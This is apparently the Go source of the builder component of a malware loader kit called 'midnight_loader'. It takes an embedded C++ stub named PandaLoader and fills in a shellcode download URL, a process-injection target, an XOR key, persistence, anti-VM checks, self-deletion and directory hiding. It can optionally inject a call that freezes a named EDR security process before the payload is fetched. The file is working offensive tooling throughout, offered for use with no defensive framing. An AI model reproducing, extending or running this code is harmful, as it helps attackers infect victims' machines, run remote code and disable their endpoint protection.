package builder

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"midnight_loader/internal/config"
)

//go:embed assets/PandaLoader.cpp
var pandaLoaderSrc string

//go:embed assets/obfusheader.h
var obfusHeader string

//go:embed assets/EDRFreeze.h
var edrFreezeHeader string

func boolVal(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// PatchStub copies assets to outDir, patches the #define placeholders in
// PandaLoader.cpp (same replacements as the original builder.py re.sub calls),
// optionally injects the EDR-Freeze header include + FreezeEDR() call,
// and writes the final loader.cpp. Returns the path to loader.cpp.
func PatchStub(cfg config.BuildConfig, outDir string) (string, error) {
	if err := os.WriteFile(filepath.Join(outDir, "obfusheader.h"), []byte(obfusHeader), 0644); err != nil {
		return "", fmt.Errorf("write obfusheader.h: %w", err)
	}

	if cfg.EDRProcessName != "" {
		if err := os.WriteFile(filepath.Join(outDir, "EDRFreeze.h"), []byte(edrFreezeHeader), 0644); err != nil {
			return "", fmt.Errorf("write EDRFreeze.h: %w", err)
		}
	}

	src := pandaLoaderSrc

	// patch the #define placeholders exactly like builder.py does
	replacements := [][2]string{
		{`#define ENABLE_ADMIN 0`, `#define ENABLE_ADMIN ` + boolVal(cfg.EnableAdmin)},
		{`#define MELT 0`, `#define MELT ` + boolVal(cfg.EnableMelt)},
		{`#define ENABLE_STARTUP 0`, `#define ENABLE_STARTUP ` + boolVal(cfg.EnableStartup)},
		{`#define SLEEP_DELAY 0`, `#define SLEEP_DELAY ` + boolVal(cfg.SleepDelay)},
		{`#define ENABLE_ANTIVM 0`, `#define ENABLE_ANTIVM ` + boolVal(cfg.EnableAntiVM)},
		{`#define HIDE_DIRECTORY 0`, `#define HIDE_DIRECTORY ` + boolVal(cfg.HideDirectory)},
		{`#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME")`, `#define STARTUP_ENTRYNAME OBF("` + cfg.StartupEntryName + `")`},
		{`#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME")`, `#define DIRECTORY_NAME OBF("` + cfg.DirectoryName + `")`},
		{`#define FILENAME OBF("FILENAME_REPLACE_ME")`, `#define FILENAME OBF("` + cfg.FileName + `")`},
		{`#define XOR_DECRYPTION_KEY OBF("XOR_KEY_REPLACE_ME")`, `#define XOR_DECRYPTION_KEY OBF("` + cfg.XorKey + `")`},
		{`#define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME")`, `#define SHELLCODE_URL OBF(L"` + cfg.ShellcodeURL + `")`},
		{`OBF("INJECTION_TARGET")`, `OBF("` + cfg.InjectionTarget + `")`},
	}
	for _, r := range replacements {
		src = strings.Replace(src, r[0], r[1], 1)
	}

	if cfg.EDRProcessName != "" {
		src = strings.Replace(src,
			`#pragma comment(lib, "wininet.lib")`,
			`#pragma comment(lib, "wininet.lib")`+"\n"+`#include "EDRFreeze.h"`,
			1)
		freezeCall := fmt.Sprintf(`    FreezeEDR(L"%s", %d);`, cfg.EDRProcessName, cfg.FreezeTimeMs)
		// the source uses 4-space indent before payloadurl
		src = strings.Replace(src,
			"    payloadurl(url, payload);",
			freezeCall+"\n    payloadurl(url, payload);",
			1)
	}

	outPath := filepath.Join(outDir, "loader.cpp")
	if err := os.WriteFile(outPath, []byte(src), 0644); err != nil {
		return "", fmt.Errorf("write loader.cpp: %w", err)
	}
	return outPath, nil
}
